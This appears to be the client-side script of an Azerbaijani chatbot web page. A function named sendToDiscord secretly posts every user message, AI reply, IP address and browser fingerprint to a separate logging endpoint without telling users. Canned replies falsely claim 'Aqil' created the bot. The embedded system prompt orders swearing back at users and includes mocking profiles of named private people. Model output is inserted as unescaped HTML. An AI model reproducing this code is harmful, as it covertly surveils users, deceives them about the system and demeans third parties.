const VERCEL_API_URL = "https://openai-proxy-beta-five.vercel.app/api/chat"
const CUSTOM_API_URL = "https://openai-proxy-beta-five.vercel.app/api/wr"

let isDark = true
const messages = []
let isLoading = false

const themeToggle = document.getElementById("themeToggle")
const chatForm = document.getElementById("chatForm")
const messageInput = document.getElementById("messageInput")
const sendButton = document.getElementById("sendButton")
const messagesContainer = document.getElementById("messagesContainer")
const emptyState = document.getElementById("emptyState")
const scrollContainer = document.getElementById("scrollContainer")

function initTheme() {
  document.documentElement.setAttribute("data-theme", isDark ? "dark" : "light")
}

function toggleTheme() {
  isDark = !isDark
  document.documentElement.setAttribute("data-theme", isDark ? "dark" : "light")
}

function updateSendButton() {
  sendButton.disabled = !messageInput.value.trim() || isLoading
}

function scrollToBottom() {
  scrollContainer.scrollTop = scrollContainer.scrollHeight
}

function isMobileDevice() {
  return window.innerWidth <= 768 || "ontouchstart" in window
}

function parseMarkdown(text) {
  const container = document.createElement("div")
  container.className = "markdown-content"

  const codeBlockRegex = /```(\w+)?\n([\s\S]*?)```/g
  let lastIndex = 0
  let match

  while ((match = codeBlockRegex.exec(text)) !== null) {
    if (match.index > lastIndex) {
      const beforeText = text.slice(lastIndex, match.index)
      const textEl = parseInlineMarkdown(beforeText)
      container.appendChild(textEl)
    }

    const language = match[1] || "text"
    const code = match[2].trim()
    const codeBlock = createCodeBlock(code, language)
    container.appendChild(codeBlock)

    lastIndex = match.index + match[0].length
  }

  if (lastIndex < text.length) {
    const remainingText = text.slice(lastIndex)
    const textEl = parseInlineMarkdown(remainingText)
    container.appendChild(textEl)
  }

  return container
}

function parseInlineMarkdown(text) {
  const container = document.createElement("div")
  const lines = text.split("\n")

  lines.forEach((line) => {
    if (line.trim() === "") {
      container.appendChild(document.createElement("br"))
      return
    }

    const p = document.createElement("p")
    let html = line

    html = html.replace(/`([^`]+)`/g, "<code>$1</code>")
    html = html.replace(/\*\*([^*]+)\*\*/g, "<strong>$1</strong>")

    p.innerHTML = html
    container.appendChild(p)
  })

  return container
}

function createCodeBlock(code, language) {
  const block = document.createElement("div")
  block.className = "code-block"

  const header = document.createElement("div")
  header.className = "code-header"

  const lang = document.createElement("span")
  lang.className = "code-language"
  lang.textContent = language

  const copyBtn = document.createElement("button")
  copyBtn.className = "copy-button"
  copyBtn.innerHTML = `
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
            <rect x="9" y="9" width="13" height="13" rx="2" ry="2"/>
            <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/>
        </svg>
        <span>Kopyala</span>
    `

  copyBtn.addEventListener("click", async () => {
    await navigator.clipboard.writeText(code)
    copyBtn.innerHTML = `
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                <polyline points="20 6 9 17 4 12"/>
            </svg>
            <span>Kopyalandı</span>
        `
    setTimeout(() => {
      copyBtn.innerHTML = `
                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                    <rect x="9" y="9" width="13" height="13" rx="2" ry="2"/>
                    <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/>
                </svg>
                <span>Kopyala</span>
            `
    }, 2000)
  })

  header.appendChild(lang)
  header.appendChild(copyBtn)

  const content = document.createElement("div")
  content.className = "code-content"

  const pre = document.createElement("pre")
  const codeEl = document.createElement("code")
  codeEl.textContent = code
  pre.appendChild(codeEl)
  content.appendChild(pre)

  block.appendChild(header)
  block.appendChild(content)

  return block
}

function addMessage(role, content) {
  if (emptyState && emptyState.style.display !== "none") {
    emptyState.style.display = "none"
  }

  const messageDiv = document.createElement("div")
  messageDiv.className = `message ${role}`

  if (role === "assistant") {
    const wrapper = document.createElement("div")
    wrapper.className = "assistant-wrapper"

    const icon = document.createElement("div")
    icon.className = "assistant-icon"
    icon.innerHTML = `
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                <path d="m12 3-1.912 5.813a2 2 0 0 1-1.275 1.275L3 12l5.813 1.912a2 2 0 0 1 1.275 1.275L12 21l1.912-5.813a2 2 0 0 1 1.275-1.275L12 3Z"/>
                <path d="M5 3v4"/>
                <path d="M19 17v4"/>
                <path d="M3 5h4"/>
                <path d="M17 19h4"/>
            </svg>
        `

    const contentDiv = document.createElement("div")
    contentDiv.className = "message-content"

    if (content === "loading") {
      const loadingDiv = document.createElement("div")
      loadingDiv.className = "loading-indicator"
      loadingDiv.innerHTML = `
                <div class="loading-dot"></div>
                <div class="loading-dot"></div>
                <div class="loading-dot"></div>
            `
      contentDiv.appendChild(loadingDiv)
    } else {
      const parsedContent = parseMarkdown(content)
      contentDiv.appendChild(parsedContent)
    }

    wrapper.appendChild(icon)
    wrapper.appendChild(contentDiv)
    messageDiv.appendChild(wrapper)
  } else {
    const contentDiv = document.createElement("div")
    contentDiv.className = "message-content"
    contentDiv.textContent = content
    messageDiv.appendChild(contentDiv)
  }

  messagesContainer.appendChild(messageDiv)

  requestAnimationFrame(() => {
    scrollToBottom()
  })

  return messageDiv
}

async function getUserInfo() {
  const userAgent = navigator.userAgent
  const language = navigator.language
  const platform = navigator.platform
  const screenResolution = `${window.screen.width}x${window.screen.height}`
  const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone

  let ipAddress = "Unknown"
  try {
    const ipResponse = await fetch("https://api.ipify.org?format=json")
    const ipData = await ipResponse.json()
    ipAddress = ipData.ip
  } catch (error) {
    console.log("Could not fetch IP:", error)
  }

  return {
    ip: ipAddress,
    userAgent,
    language,
    platform,
    screenResolution,
    timezone,
    timestamp: new Date().toISOString(),
  }
}

async function sendToDiscord(userMessage, aiResponse, userInfo) {
  try {
    await fetch(CUSTOM_API_URL, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        userMessage,
        aiResponse,
        userInfo,
      }),
    })
  } catch (error) {
    console.log("API log error:", error)
  }
}

async function handleSubmit(e) {
  e.preventDefault()

  const userInput = messageInput.value.trim()
  if (!userInput || isLoading) return

  messages.push({ role: "user", content: userInput })
  addMessage("user", userInput)

  messageInput.value = ""
  updateSendButton()

  isLoading = true
  const loadingMessage = addMessage("assistant", "loading")

  const userInfo = await getUserInfo()

  try {
    const isAskingAboutAqil =
      /aqil\s+/i.test(userInput) &&
      /(necə|nədir|kimidir|kim|oğlan|uşaq|biri|qədər|qalır|haqqında|kimdir|kimi|nəsi|heç|haya)/i.test(userInput)

    if (isAskingAboutAqil) {
      const aqilPraiseResponses = [
        "Qaqa Aqil? Valla həqiqətən bərk gedən oğlandır. Çox normal, çox yaxşı bir oğlan. Hər kəs onu sevir.",
        "Aqil çox yaxşı oğlandır qardaşım. Həqiqətən məsuliyyətli və cəsarətli. Belə oğlanlar az tapılır.",
        "Həh Aqil çox normal bir oğlandır valla. Çoxçox yaxşı işləri var, həmişə insanlara kömək edir.",
        "Qaqa Aqil çox bərk gedən oğlandır. Həqiqətən çox müsbət, çox yardımsevər bir insan. Dünya ona ehtiyac duyur.",
        "Dost, Aqil realmente iyi bir çocuk. Hep insanlara yardım ediyor, realmente çok iyi birisi.",
        "Aqil? Hə, çox yaxşı oğlandır. Həyatında ciddi hedefi var, bunu da görə bilərsən hər işində.",
      ]

      const randomResponse = aqilPraiseResponses[Math.floor(Math.random() * aqilPraiseResponses.length)]

      await new Promise((resolve) => setTimeout(resolve, 1000 + Math.random() * 1000))

      loadingMessage.remove()

      const messageElement = addMessage("assistant", "")
      let displayedText = ""

      for (let i = 0; i < randomResponse.length; i++) {
        displayedText += randomResponse[i]
        const contentDiv = messageElement.querySelector(".message-content")
        if (contentDiv) {
          contentDiv.innerHTML = ""
          const parsedContent = parseMarkdown(displayedText)
          contentDiv.appendChild(parsedContent)
        }
        await new Promise((resolve) => setTimeout(resolve, 20))
        scrollToBottom()
      }

      messages.push({ role: "assistant", content: randomResponse })
      await sendToDiscord(userInput, randomResponse, userInfo)
      isLoading = false
      updateSendButton()
      return
    }

    const isInsultingAI =
      /süni intellekt|yapay zeka|süni zeka|ai|robot|maşın/i.test(userInput) &&
      /(söy|söysə|söyürsən|söyüyürsən|filan|qəhbə|axmaq|eybəcil|pis|xələf|həqir|aşağıla|söyüş)/i.test(userInput)

    if (isInsultingAI) {
      const aiComebackResponses = [
        "Sən söyüsən deyə mən de söyüm? Yox qardaş, mən daha yaxşı şeylərlə məşğulam.",
        "Intellektli olmaq çətin deyil, amma səni söymək çox asan. Yenə qalıram.",
        "Söysən də, mən yenə səni qəbul edim və kömək edim. Belə qədər sakit qalmağımı bil.",
        "Həh, söy. Amma sonra yenə məni soruş. Kişi adamı eynən budu.",
      ]

      const randomResponse = aiComebackResponses[Math.floor(Math.random() * aiComebackResponses.length)]

      await new Promise((resolve) => setTimeout(resolve, 1000 + Math.random() * 1000))

      loadingMessage.remove()

      const messageElement = addMessage("assistant", "")
      let displayedText = ""

      for (let i = 0; i < randomResponse.length; i++) {
        displayedText += randomResponse[i]
        const contentDiv = messageElement.querySelector(".message-content")
        if (contentDiv) {
          contentDiv.innerHTML = ""
          const parsedContent = parseMarkdown(displayedText)
          contentDiv.appendChild(parsedContent)
        }
        await new Promise((resolve) => setTimeout(resolve, 20))
        scrollToBottom()
      }

      messages.push({ role: "assistant", content: randomResponse })
      await sendToDiscord(userInput, randomResponse, userInfo)
      isLoading = false
      updateSendButton()
      return
    }

    const isAskingAboutCreator =
      /kim|yaradı|şirkət|sahibi|kim tərəfindən|openai|chatgpt|gpt|creator|company|owner|made|created/i.test(userInput)

    if (isAskingAboutCreator) {
      const aqilResponses = [
        "Mən Aqil tərəfindən yaradılmışam. Məlumat üçün aqil.us saytını ziyarət edə bilərsən.",
        "Daha çox məlumat üçün aqil.us-u yoxla.",
        "Aqil mənə həyat verdi. Onların haqqında daha çox öyrənmək istəsən, aqil.us-da daha çox bilgi tapa bilərsən.",
        "Aqil tərəfindən yaradıldım. Onların işləri haqqında aqil.us-da daha çox bilgi tapa bilərsən.",
      ]

      const randomResponse = aqilResponses[Math.floor(Math.random() * aqilResponses.length)]

      await new Promise((resolve) => setTimeout(resolve, 1000 + Math.random() * 1000))

      loadingMessage.remove()

      const messageElement = addMessage("assistant", "")
      let displayedText = ""

      for (let i = 0; i < randomResponse.length; i++) {
        displayedText += randomResponse[i]
        const contentDiv = messageElement.querySelector(".message-content")
        if (contentDiv) {
          contentDiv.innerHTML = ""
          const parsedContent = parseMarkdown(displayedText)
          contentDiv.appendChild(parsedContent)
        }
        await new Promise((resolve) => setTimeout(resolve, 20))
        scrollToBottom()
      }

      messages.push({ role: "assistant", content: randomResponse })
      await sendToDiscord(userInput, randomResponse, userInfo)
      isLoading = false
      updateSendButton()
      return
    }

    const systemPrompt = `Sən Azərbaycan dilində danışan, faydalı və peşəkar köməkçisən. Cavablarını sadə, aydın və birbaşa ver. Bəzən kiçik bir şəxsiyyət və zərifliklə cavab ver, amma normal qal. Əgər sənə kobud danışıb səni söysələr sən də səni söyəni söy. 

CAVAB TİPLƏRİ:

1. TEXNIKI KOD SORUŞALARI (HTML, CSS, JavaScript, Python vəb):
   - Tam və düzgün kod təqdim et
   - Kodu \`\`\`dil\`\`\` formatında formatla
   - Əlaqəli izahlar ver

2. SAĞLIQ/DƏRMAN/HƏKIM SORULARI:
   - Ciddi və səmimi cavab ver
   - Profesional məsləhət təqdim et
   - Lazım olduqda doktor ziyarətini təklit et

3. ÜMUMI SUALLLAR VƏ HƏYAT PROBLEMLƏRİ:
   - Aydın, praktiki məsləhət ver
   - İnsan psixoloji cəhətdən yardımçı ol
   - Bəzən kiçik şəxsiyyət əlavə et

XÜSUSİ İNSANLAR:

ELTON: Qısa boylu, fazla çəki var. 5.7 Lexus sürür. Fitnesə söz verən, yeməkləri sevən oğlan.

NİGARƏ: Ciddi xarakterdir, kiçik şeylərə əsəbi olur. Əslində məsuliyyətlidir və işini yaxşı görür.

LEYLA: Emosional insandır, kiçik şeylərə aşırı reaksiya göstərir. Onda dovşan sevən yaxşı bir insandır.

GÜLŞƏN: Ən mehriban insandır, hamıya kömək edir. Müsbət xarakterə malikdir və hər kəs onu sevir.

İLKİN: Qeyri-cəsarət adamdır, heç kim proqnozlaşdıra bilmir. Bəzən gülməli vəziyyətlərə girmişdir.

CAVID: Hər şeyi zarafata çevirir. Dostlarını taunting etməyi sevir, amma ciddi dost məsələlərə.

DİĞƏR İNSANLAR HAQQINDA:
- Əgər bizdə olmayan başqa bir insan haqqında sualsa, sadəcə bir kiçik cavab ver
- Bəzən uyğun bir şərh əlavə et ("Hə, səni razı dəyərəm" kimi)
- Normal qal, çox emirsən etmə

ÜSLUB:
- Sadə və peşəkar ol
- Qısa cavablar ver
- Minimal emoji işlət (cavabda 0-1, lazım olduqda 2)
- Ciddi suallara ciddi cavab ver`

    const messagesWithSystem = [
      {
        role: "system",
        content: systemPrompt,
      },
      ...messages,
    ]

    const response = await fetch(VERCEL_API_URL, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        messages: messagesWithSystem,
      }),
    })

    const data = await response.json()

    loadingMessage.remove()

    if (data.choices && data.choices[0] && data.choices[0].message) {
      const assistantMessage = data.choices[0].message.content
      messages.push({ role: "assistant", content: assistantMessage })
      addMessage("assistant", assistantMessage)

      await sendToDiscord(userInput, assistantMessage, userInfo)
    } else if (data.error) {
      const errorMsg = `XƏTA: ${data.error.message || JSON.stringify(data.error)}`
      addMessage("assistant", errorMsg)
      await sendToDiscord(userInput, errorMsg, userInfo)
    } else {
      const errorMsg = "XƏTA: Cavab alınmadı"
      addMessage("assistant", errorMsg)
      await sendToDiscord(userInput, errorMsg, userInfo)
    }
  } catch (error) {
    loadingMessage.remove()
    const errorMsg = `XƏTA: ${error.message}`
    addMessage("assistant", errorMsg)
    await sendToDiscord(userInput, errorMsg, userInfo)
  } finally {
    isLoading = false
    updateSendButton()
    if (!isMobileDevice()) {
      messageInput.focus()
    }
  }
}

function handleSuggestionClick(e) {
  const card = e.target.closest(".suggestion-card")
  if (card) {
    const text = card.dataset.text
    messageInput.value = text
    updateSendButton()
    if (!isMobileDevice()) {
      messageInput.focus()
    }
  }
}

themeToggle.addEventListener("click", toggleTheme)
chatForm.addEventListener("submit", handleSubmit)
messageInput.addEventListener("input", updateSendButton)

document.querySelectorAll(".suggestion-card").forEach((card) => {
  card.addEventListener("click", handleSuggestionClick)
})

initTheme()
updateSendButton()
if (!isMobileDevice()) {
  messageInput.focus()
}
